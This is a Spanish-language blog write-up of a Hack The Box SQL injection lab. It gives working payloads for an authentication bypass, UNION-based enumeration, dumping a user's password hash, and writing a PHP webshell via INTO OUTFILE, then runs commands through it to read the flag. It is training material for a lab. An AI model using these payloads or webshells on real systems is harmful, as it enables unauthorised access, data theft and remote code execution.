<!DOCTYPE html>
<html lang="en-us">

<head><title>
    
    Laboratorio De Fundamentos De SQLi | 
    
    CHL Blog
</title>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<link rel="canonical" href="https://chlorenzo.com/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-de-fundamentos-de-sqli/" />
<link rel="icon" type="image/png" href="https://chlorenzo.com/image/favicon.ico">


<meta name="description" content="
    En este laboratorio, explotamos un panel de autenticación vulnerable para obtener acceso, enumeramos bases de datos y privilegios del usuario root, finalmente subimos una webshell al servidor, consiguiendo (RCE) .
    "
/>
<meta property="og:description" content="
    En este laboratorio, explotamos un panel de autenticación vulnerable para obtener acceso, enumeramos bases de datos y privilegios del usuario root, finalmente subimos una webshell al servidor, consiguiendo (RCE) .
    " 
/>




<meta property="og:title" content="Laboratorio de Fundamentos de SQLi" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://chlorenzo.com/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-de-fundamentos-de-sqli/" /><meta property="article:section" content="pagina_web" />
<meta property="article:published_time" content="2025-08-22T00:00:00+00:00" />
<meta property="article:modified_time" content="2025-08-22T00:00:00+00:00" />





  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Laboratorio de Fundamentos de SQLi">
  <meta name="twitter:description" content="En este laboratorio, explotamos un panel de autenticación vulnerable para obtener acceso, enumeramos bases de datos y privilegios del usuario root, finalmente subimos una webshell al servidor, consiguiendo (RCE) .">


  <meta itemprop="name" content="Laboratorio de Fundamentos de SQLi">
  <meta itemprop="description" content="En este laboratorio, explotamos un panel de autenticación vulnerable para obtener acceso, enumeramos bases de datos y privilegios del usuario root, finalmente subimos una webshell al servidor, consiguiendo (RCE) .">
  <meta itemprop="datePublished" content="2025-08-22T00:00:00+00:00">
  <meta itemprop="dateModified" content="2025-08-22T00:00:00+00:00">
  <meta itemprop="wordCount" content="505">
  <meta itemprop="keywords" content="Hackthebox,SQLi,Web">




<link rel="stylesheet" href="https://chlorenzo.com/main.min.css">





<script src="https://chlorenzo.com/bundle.js"></script>







<script data-ad-client="adsense-key" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>




    <script async src="https://www.googletagmanager.com/gtag/js?id=G-4G9W14SLG4"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-4G9W14SLG4');
</script>






</head>

<body><header id="header">
  <div class="top-bar">
    <div class="container-md">

      <div class="row align-items-center">
        <div class="col-3 col-sm-4 social-buttons d-none d-sm-block">
          <ul>
    
    

    
    <li>
        <a href="https://www.youtube.com/@CHL_Hands_On" target="_blank">
            <i class="fab fa-youtube"></i></a>
    </li>
    

    
    <li>
        <a href="https://www.instagram.com/19chl96/" target="_blank">
            <i class="fab fa-instagram"></i></a>
    </li>
    

    
    <li>
        <a href="https://github.com/chernadez321" target="_blank">
            <i class="fab fa-github"></i></a>
    </li>
    

    

    
    <li>
        <a href="https://www.linkedin.com/in/chlinked/" target="_blank">
            <i class="fab fa-linkedin"></i></a>
    </li>
    

</ul>
        </div>

        <div class="ra-toggler col-3 col-sm-4 d-block d-sm-none">
          <button class="bg-dark" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
            <i class="fas fa-bars"></i>
          </button>
        </div>

        <div class="col-6 col-sm-4">
          <h2 class="title"><a href="https://chlorenzo.com/">CHL Blog</a></h2>
        </div>

        
        <div class="col-3 col-sm-4">
          <div class="col col-md-8 offset-md-4 d-none d-sm-block">
            <form id="cse-search-box-form-id" class="input-group search-bar" onsubmit="return executeQuery('lg');"
              role="search">
              <input id="cse-search-input-box-id" type="text" class="form-control" placeholder="Search">
              <button class="btn" type="submit">
                <i class="fa fa-search"></i>
              </button>
            </form>
          </div>
        </div>
        

      </div>
    </div>
  </div>

  <div class="container-md">
    <nav class="navbar navbar-expand-sm navbar-dark bg-dark sticky-top">
      <div class="collapse navbar-collapse" id="navbarNav">
        <ul class="navbar-nav mx-auto">

          <li class="nav-item d-block d-sm-none">
            <ul class="social-buttons">
              <ul>
    
    

    
    <li>
        <a href="https://www.youtube.com/@CHL_Hands_On" target="_blank">
            <i class="fab fa-youtube"></i></a>
    </li>
    

    
    <li>
        <a href="https://www.instagram.com/19chl96/" target="_blank">
            <i class="fab fa-instagram"></i></a>
    </li>
    

    
    <li>
        <a href="https://github.com/chernadez321" target="_blank">
            <i class="fab fa-github"></i></a>
    </li>
    

    

    
    <li>
        <a href="https://www.linkedin.com/in/chlinked/" target="_blank">
            <i class="fab fa-linkedin"></i></a>
    </li>
    

</ul>
            </ul>
          </li>

          
          
          <li class="nav-item">
            <a class="nav-link 
              
              " 
              href="https://chlorenzo.com/">
              Home
            </a>
          </li>
          
          
          
          <li class="nav-item dropdown">
            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown">
              Blog
            </a>
            <div class="dropdown-menu">
              
              
                <a class="dropdown-item" href="https://chlorenzo.com/pagina_web/blog/seguridad_para_todos/">Seguridad para todos</a>
              
              
              
                <a class="dropdown-item" href="https://chlorenzo.com/pagina_web/blog/write-ups/">Write-ups</a>
              
              
              
                <div class="dropdown-divider"></div>
              
              
              
                <a class="dropdown-item" href="https://chlorenzo.com/tags/">Búsqueda por etiquetas</a>
              
              
            </div>
          </li>
          
          
          
          <li class="nav-item">
            <a class="nav-link 
              
              " 
              href="https://chlorenzo.com/pagina_web/trayectoria/">
              Trayectoria
            </a>
          </li>
          
          
          
          <li class="nav-item">
            <a class="nav-link 
              
              " 
              href="https://chlorenzo.com/pagina_web/contact/">
              Contacto
            </a>
          </li>
          
          
        </ul>

        
        <form id="cse-search-box-form-id2" class="d-flex search-bar d-block d-sm-none"
          onsubmit="return executeQuery('xs');" role="search">
          <input id="cse-search-input-box-id2" type="text" class="form-control" placeholder="Search">
          <button class="btn" type="submit">
            <i class="fa fa-search"></i>
          </button>
        </form>
        

      </div>
    </nav>
  </div>
</header>

<main class="blog-content">
    <div class="container-md">
        <div class="row">
            
            <div class="col-lg-2 d-none d-xl-block">
                <div class="ad-left-offset"></div>
                
            </div>

            <div class="col-md-12 col-lg-8 px-lg-4">
                

                <h1 class="title">Laboratorio de Fundamentos de SQLi</h1>

                <div class="container-fluid px-0 mb-4">
                    <div class="row align-items-end">
                        <div class="col-md-4 date-time">
                            <span class="date">
    Aug 22, 2025
</span>
                            &centerdot;
                            <span class="time-to-read">
    3 mins read</span>
                        </div>

                        <div class="col-md-8 tags ">
                            
                            <a href="https://chlorenzo.com/tags/hackthebox"><span
                                    class="tag bg-dark">hackthebox</span></a>
                            
                            <a href="https://chlorenzo.com/tags/sqli"><span
                                    class="tag bg-dark">SQLi</span></a>
                            
                            <a href="https://chlorenzo.com/tags/web"><span
                                    class="tag bg-dark">web</span></a>
                            
                        </div>
                    </div>
                </div>

                

                <p><img src="../../../../../images/Miniaturas/sqli.png" alt=""></p>
<h4 id="enunciado">Enunciado</h4>
<p>La empresa <code>Inlanefreight</code>le ha contratado para realizar una evaluación de su aplicación web en uno de sus sitios web públicos. Tras una reciente vulneración de seguridad de uno de sus principales competidores, les preocupan especialmente las vulnerabilidades de inyección SQL y el daño que el descubrimiento y la explotación exitosa de este ataque podrían causar a su imagen pública y sus resultados.</p>
<p>Proporcionaron una dirección IP de destino y no proporcionaron más información sobre su sitio web. Realice una evaluación completa de la aplicación web con un enfoque de &ldquo;caja gris&rdquo;, verificando la existencia de vulnerabilidades de inyección SQL.</p>
<p>Identifique las vulnerabilidades y envíe una alerta final utilizando las habilidades que vimos para completar este módulo. ¡No olvide pensar de forma innovadora!</p>
<p><strong>Evalúe la aplicación web y utilice diversas técnicas para obtener la ejecución remota de código y encontrar una bandera en el directorio raíz del sistema de archivos.
Envíe el contenido de la bandera como respuesta.</strong></p>
<p>Al dirigirnos a la IP que nos dan vemos que tenemos un panel de autenticación, el cual debemos pasar, y empezamos a enumerar con las querys típicas.
<img src="../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-1.png" alt="">
Vemos que tenemos acceso con:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; OR 1-- -
</span></span></span></code></pre></div><p>Redirigiendonos para dashboard.php.</p>
<p><img src="../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-2.png" alt=""></p>
<p>Vemos la cantidad de columnas de la tabla
<img src="../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-3.png" alt=""></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; order by 6;-- -;
</span></span></span></code></pre></div><p>Vemos que falla con 6 por lo que tiene 5 columnas.</p>
<p>Hacemos la query para posicionar los números.
<img src="../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-4.png" alt="">
Vemos las bases de datos:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; union select 1,schema_name,3,4,5 from information_schema.schemata-- -
</span></span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-5.png" alt="">
Vemos las tablas:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; union select 1, table_name,3,4,5 from information_schema.tables where table_schema=&#39;</span>ilfreight<span style="color:#e6db74">&#39; -- -
</span></span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-6.png" alt="">
Vemos las columnas:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; union select 1, column_name,3,4,5 from information_schema.columns where table_schema=&#39;</span>ilfreight<span style="color:#e6db74">&#39; and table_name=&#39;</span>users<span style="color:#e6db74">&#39;-- -
</span></span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-7.png" alt="">
Vemos los datos:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>us<span style="color:#e6db74">&#39; union select 1, username,password,4,5 from ilfreight.users-- -
</span></span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-8.png" alt="">
Vemos el hash del ussuario adam.
<code>adam:1be9f5d3a82847b8acca40544f953515</code></p>
<p>Vemos que usuario tenemos en la aplicación web:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>us<span style="color:#e6db74">&#39; union select 1, user(),3,4,5-- -
</span></span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-9.png" alt="">
Vemos que tenemos el usuario root, vemos si tenemos privilegios como superadministrador.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT 1,super_priv,3,4,5 FROM mysql.user-- -
</span></span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-10.png" alt="">
Vemos mas en detalle los permisos que tenemos como usuario root sobre el servidor:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>cn<span style="color:#e6db74">&#39; UNION SELECT 1, grantee, privilege_type, 4, 5 FROM information_schema.user_privileges WHERE grantee=&#34;&#39;</span>root<span style="color:#e6db74">&#39;@&#39;</span>localhost<span style="color:#e6db74">&#39;&#34;-- -
</span></span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-11.png" alt="">
Y vemos que podemos leer, modificar, incluso subir archivos al servidor.
Vemos que tenemos el usuario con permisos FILE, comprobamos si la variable <code>secure_file_priv</code> está deshabilitada.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables where variable_name=&#34;secure_file_priv&#34;-- -
</span></span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-12.png" alt="">
Que es el caso.
Cuando intentamos subir archivos en <code>/var/www/html/</code> no nos permite porque no tenemos permisos sin embargo en <code>/var/www/html/dashboard/</code> si. Con lo cual hacemos una prueba</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; union select 1,&#39;</span>file written successfully<span style="color:#f92672">!</span><span style="color:#e6db74">&#39;,3,4,5 into outfile &#39;</span><span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>html<span style="color:#f92672">/</span>dashboard<span style="color:#f92672">/</span>proof.txt<span style="color:#e6db74">&#39;-- -
</span></span></span></code></pre></div><p>Visitamos la ruta
(http://IP:Puerto/dashboard/proof.txt)
<img src="../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-14.png" alt=""></p>
<p>Subimos nuestra webshell:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; union select 1,&#39;</span><span style="color:#f92672">&lt;?</span>php <span style="color:#66d9ef">system</span>(<span style="color:#960050;background-color:#1e0010">$</span>_REQUEST[cmd]); <span style="color:#f92672">?&gt;</span><span style="color:#e6db74">&#39;, 3, 4, 5 into outfile &#39;</span><span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>html<span style="color:#f92672">/</span>dashboard<span style="color:#f92672">/</span>shell.php<span style="color:#e6db74">&#39;-- -
</span></span></span></code></pre></div><p>Visitamos:
(http://IP:Puerto/dashboard/shell.php?cmd=whoami)
<img src="../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-15.png" alt="">
Al visitar la ruta de nuestra webshell vemos que tenemos ejecución remota de comandos en el servidor
Vemos los archivos en la raíz.
(http://IP:Puerto/dashboard/shell.php?cmd=ls /)</p>
<p><img src="../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-16.png" alt="">
Leemos la flag
(http://IP:Puerto/dashboard/shell.php?cmd=cat /flag_cae1dadcd174.txt)</p>
<p><img src="../../../../../images/HTB_modulos/SQLi_lab_1/flag_1-17.png" alt=""></p>
<p>Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.</p>


                <div id="social-media-share">
	<p><i>Escríbeme por cualquiera de las vías</i></p>
	
	<div class="share-buttons">
	    
		<a href="https://www.instagram.com/19chl96/" 
   			target="_blank" 
   			title="Sígueme en Instagram">
    		<img src=https://chlorenzo.com/icons/45px/instagram.png alt="Instagram">
		</a>

		<a  href="https://www.linkedin.com/in/chlinked/"
	        onclick="socialMediaPopUp(this.href, '', 900, 500); return false;"
	        title="Share on LinkedIn. Opens in a new window." >
	        <img src=https://chlorenzo.com/icons/48px/linkedin.png>
	    </a>

	    <a href="https://mail.google.com/mail/?view=cm&fs=1&to=chlorenzo96@gmail.com&su=Para Carlos&body=Hola." 
   		   target="_blank" 
   		   title="Enviar correo usando Gmail">
    	<img src=https://chlorenzo.com/icons/48px/email.png alt="Email">
		</a>

		

	</div>
</div>



                
                <br>
                <div id="disqus_thread"></div>
<script type="text/javascript">
    (function () {
        
        
        if (window.location.hostname == "localhost")
            return;

        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        var disqus_shortname = '';
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
            </div>

            <div class="col-lg-2 d-none d-xl-block">
                <div class="ad-right-offset"></div>
                
            </div>
        </div>
    </div>
</main>

<footer class="bg-dark text-light py-4">
    <div class="container-md">
        <div class="row justify-content-center">
            <div class="col-12">
                <nav class="navbar navbar-expand-sm navbar-dark bg-dark justify-content-center">
                    <ul class="navbar-nav">
                        <li class="nav-item">
                            <a class="nav-link" href="https://chlorenzo.com/">Home</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="https://chlorenzo.com/pagina_web/blog/seguridad_para_todos/">Seguridad para todos</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="https://chlorenzo.com/pagina_web/blog/write-ups/">Write-ups</a>
                        </li>
                    </ul>
                </nav>
            </div>
        </div>
    </div>
    <div class="text-center mt-3">
        <p>© 2025 Carlos Hernández Lorenzo</p>
    </div>
</footer>


<script async src="https://cse.google.com/cse.js?cx=google-cse-key"></script>
<gcse:searchresults-only></gcse:searchresults-only>

</body>

</html>